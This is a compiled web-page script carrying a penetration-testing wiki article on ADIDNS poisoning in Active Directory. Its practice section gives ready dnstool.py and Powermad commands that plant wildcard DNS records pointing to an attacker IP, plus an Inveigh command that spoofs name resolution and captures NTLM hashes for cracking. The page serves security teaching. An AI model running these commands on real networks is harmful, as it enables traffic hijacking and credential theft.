import{_ as h,c as d,a5 as r,G as a,w as t,j as i,a as e,B as o,o as k}from"./chunks/framework.B5CpDqM0.js";const p="/assets/WINS%20Lookup.C-F8xPyl.png",f=JSON.parse('{"title":"ADIDNS poisoning","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/adidns-spoofing.md","filePath":"ad/movement/mitm-and-coerced-authentications/adidns-spoofing.md","lastUpdated":1724982529000}'),c={name:"ad/movement/mitm-and-coerced-authentications/adidns-spoofing.md"};function g(u,s,y,b,F,m){const n=o("PluginTabsTab"),l=o("PluginTabs");return k(),d("div",null,[s[4]||(s[4]=r('<h1 id="adidns-poisoning" tabindex="-1">ADIDNS poisoning <a class="header-anchor" href="#adidns-poisoning" aria-label="Permalink to &quot;ADIDNS poisoning&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>In order to function properly, Active Directory services need DNS. In that matter, Active Directory Domain Services (AD-DS) offer an integrated storage and replication service for DNS records. This is called Active Directory Integrated DNS (ADIDNS).</p><p>Just like any other domain name resolution spoofing attack, if an attacker is able to resolve requests with an arbitrary IP address, traffic gets hijacked, the attacker becomes a Man-in-the-Middle and further attacks can be operated.</p><p>Since ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic.</p><p>ADIDNS zones can be remotely edited</p><ul><li>with dynamic updates (a DNS specific protocol used by machine accounts to add and update their own DNS records). Users can create records if they don&#39;t exist, and they will have full control over it. By default, users that don&#39;t own a record will not be able to edit it, or to add another one with the same name, even if the type is different (A, AAAA, CNAME, MX, and so on).</li><li>by using LDAP to create dnsNode objects. While dynamic updates can&#39;t be used to inject a wildcard DNS record, LDAP can be (only if the record doesn&#39;t already exist, which is the case by default).</li></ul><h3 id="wildcard-records-wins" tabindex="-1">Wildcard records &amp; WINS <a class="header-anchor" href="#wildcard-records-wins" aria-label="Permalink to &quot;Wildcard records &amp; WINS&quot;">​</a></h3><blockquote><p>Wildcard records allow DNS to function in a very similar fashion to LLMNR/NBNS spoofing. Once you create a wildcard record, the DNS server will use the record to answer name requests that do not explicitly match records contained in the zone. (<a href="https://blog.netspi.com/exploiting-adidns/#wildcard" target="_blank" rel="noreferrer">source</a>)</p></blockquote><p>💡 In some scenarios, adding a wildcard record to the proper ADIDNS zone won&#39;t work. This is usually due to the WINS forward lookup being enabled on that zone. WINS forward lookup makes the DNS server send a NBT-NS Query Request to a predefined WINS server when it receives an address record query for which it doesn&#39;t know the answer. In short, it serves the same purpose as the wildcard record. This feature needs to be disabled for the wildcard record to be used.</p><p><img src="'+p+'" alt="Domain Controller &gt; DNS Manager &gt; zone properties &gt; WINS"></p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="wins-forward-lookup" tabindex="-1">WINS forward lookup <a class="header-anchor" href="#wins-forward-lookup" aria-label="Permalink to &quot;WINS forward lookup&quot;">​</a></h3>',13)),a(l,null,{default:t(()=>[a(n,{label:"UNIX-like"},{default:t(()=>s[0]||(s[0]=[i("p",null,[e("The state of WINS forward lookup can be enumerated with "),i("a",{href:"https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py",target:"_blank",rel:"noreferrer"},"dnstool.py"),e(' (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.')],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dnstool.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN\\USER'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'PASSWORD'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --record"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '@'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'query'"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DomainController'")])])])],-1)])),_:1}),a(n,{label:"Windows"},{default:t(()=>s[1]||(s[1]=[i("p",null,[e("The state of WINS forward lookup can be enumerated with "),i("a",{href:"https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py",target:"_blank",rel:"noreferrer"},"dnstool.py"),e(' (Python). The entry type 65281 (i.e. "WINS") will exist if WINS forward lookup is enabled.')],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Get-DNSServerResourceRecord"),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ZoneName "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"DOMAIN.FQDN"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," -"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"RRType "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"WINS"')])])])],-1)])),_:1})]),_:1}),s[5]||(s[5]=i("h3",{id:"manual-record-manipulation",tabindex:"-1"},[e("Manual record manipulation "),i("a",{class:"header-anchor",href:"#manual-record-manipulation","aria-label":'Permalink to "Manual record manipulation"'},"​")],-1)),a(l,null,{default:t(()=>[a(n,{label:"UNIX-like"},{default:t(()=>s[2]||(s[2]=[i("p",null,[e("An awesome Python alternative to Powermad's functions is "),i("a",{href:"https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py",target:"_blank",rel:"noreferrer"},"dnstool"),e(". Theoretically, this script can be used to "),i("code",null,"add"),e(", "),i("code",null,"modify"),e(", "),i("code",null,"query"),e(", "),i("code",null,"remove"),e(", "),i("code",null,"resurrect"),e(" and "),i("code",null,"ldapdelete"),e(" records in ADIDNS.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# query a node")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dnstool.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN\\user'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --record"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '*'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," query"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DomainController")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# add a node and attach a record")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"dnstool.py"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'DOMAIN\\user'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'password'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --record"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '*'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --action"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," add"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," --data"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $AttackerIP $DomainController")])])])],-1)])),_:1}),a(n,{label:"Windows"},{default:t(()=>s[3]||(s[3]=[i("p",null,[e("On Windows, the "),i("a",{href:"https://github.com/Kevin-Robertson/Powermad",target:"_blank",rel:"noreferrer"},"Powermad "),e("module can be used to manually add, view, edit, enable, disable or remove records and nodes. In the following examples, the wildcard ("),i("code",null,"*"),e(") node/record is targeted but the examples should also work with other records (except things like "),i("code",null,"WPAD"),e(" that are in the "),i("a",{href:"./wpad-spoofing#through-adidns-spoofing"},"GQBL"),e(").")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# get the value populated in the DNSRecord attribute of a node")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-ADIDNSNodeAttribute"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Attribute"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," DNSRecord")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# creates a wildcard record, sets the DNSRecord and DNSTombstoned attributes")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"New-ADIDNSNode"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Tombstone"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Verbose"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Data"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_IP")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# append, populate, or overwrite values in a DNS node attribute")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-ADIDNSNodeAttribute"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Attribute"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," DNSRecord"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Value"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," (New-DNSRecordArray "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-Data"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_IP) -Verbose")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# a tombstoned record can be turned again into a valid record with the following command")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Enable-ADIDNSNode"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# disable (i.e. tombstone) a node")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Disable-ADIDNSNode"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# remove a node")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Remove-ADIDNSNode"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# check the wildcard record works/resolve a name")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Resolve-DnsName"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," NameThatDoesntExist")])])])],-1),i("div",{class:"success custom-block"},[i("p",null,"TL; DR: the following command will add a new wildcard record (if it doesn't already exist) with the attacker IP set in the DNSRecord attribute"),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"New-ADIDNSNode"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Tombstone"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Verbose"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Node"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," *"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -Data"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $ATTACKER_IP")])])])])],-1),i("div",{class:"caution custom-block"},[i("p",null,[e("Warning: in some environments, the disabling or removal of the records previously created for tests failed. The records were shown as tombstoned or nonexistant when using functions like "),i("code",null,"Get-ADIDNSNodeOwner"),e(", "),i("code",null,"Get-ADIDNSNodeAttribute"),e(", and so on. I think it was due to some replication issues.")]),i("p",null,"However, the DNS Manager console was still showing those records and name resolution was still effective. It will probably stay an unsolved mystery for me, but testers need to keep this in mind when abusing ADIDNS.")],-1),i("p",null,[e("More help on usage, support functions, parameters and attacks "),i("a",{href:"https://github.com/Kevin-Robertson/Powermad#adidns-functions",target:"_blank",rel:"noreferrer"},"here"),e(".")],-1)])),_:1})]),_:1}),s[6]||(s[6]=r('<div class="tip custom-block"><p>When adding records has no impact on name resolution or when the tools throw errors like <code>NoSuchObject</code>, it could be that the DNS zones in use are stored in the legacy <code>System</code> partition, or the <code>ForestDnsZones</code>, instead of the <code>DomainDnsZones</code> one.</p><p>This can be set with the <code>--legacy</code> or <code>--forest</code> option on dnstool.py, or with the <code>-Partition</code> argument for Powermad.</p></div><h3 id="dynamic-spoofing" tabindex="-1">Dynamic spoofing <a class="header-anchor" href="#dynamic-spoofing" aria-label="Permalink to &quot;Dynamic spoofing&quot;">​</a></h3><p>Using <a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noreferrer">Inveigh</a> (Powershell), the following command will</p><ul><li>operate <a href="./llmnr-nbtns-mdns-spoofing">LLMNR, NBT-NS and mDNS spoofing</a></li><li>operate ADIDNS spoofing</li><li><code>combo</code> looks at LLMNR/NBNS requests and adds a record to DNS if the same request is received from multiple systems</li><li><code>ns</code> injects an NS record and if needed, a target record. This is primarily for the GQBL bypass for wpad.</li><li><code>wildcard</code> injects a wildcard record</li><li>set the threshold at which the combo ADIDNS spoofing mode will take effect</li><li>enable showing NTLM challenge/response captures from machine accounts</li><li>set the Challenge to <code>1122334455667788</code> (to <a href="./../credentials/cracking#practice">crack NTLM hashes</a> with <a href="https://crack.sh/" target="_blank" rel="noreferrer">crack.sh</a>)</li></ul><div class="language-powershell vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">powershell</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">Invoke-Inveigh</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ConsoleOutput Y </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ADIDNS combo</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ns</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">,</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">wildcard </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">ADIDNSThreshold </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">3</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">LLMNR Y </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">NBNS Y </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">mDNS Y </span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">-</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">Challenge </span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1122334455667788</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">MachineAccounts Y</span></span></code></pre></div><p><a href="https://github.com/Kevin-Robertson/Inveigh/wiki/Basics" target="_blank" rel="noreferrer">This wiki page</a> can be really useful to help master Inveigh and its support functions</p><ul><li><code>Clear-Inveigh</code> to clear Inveigh&#39;s hashtable</li><li><code>Get-Inveigh</code> to get data from Inveigh&#39;s hashtable</li><li><code>Stop-Inveigh</code> to stop all running modules</li><li><code>Watch-Inveigh</code> to enable real time console output</li></ul><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://blog.netspi.com/exploiting-adidns/" target="_blank" rel="noreferrer">https://blog.netspi.com/exploiting-adidns/</a></p><p><a href="https://blog.netspi.com/adidns-revisited/" target="_blank" rel="noreferrer">https://blog.netspi.com/adidns-revisited/</a></p><p><a href="https://snovvcrash.rocks/2020/12/28/htb-hades.html#spoofing-active-directory-integrated-dns" target="_blank" rel="noreferrer">https://snovvcrash.rocks/2020/12/28/htb-hades.html#spoofing-active-directory-integrated-dns</a></p>',11))])}const D=h(c,[["render",g]]);export{f as __pageData,D as default};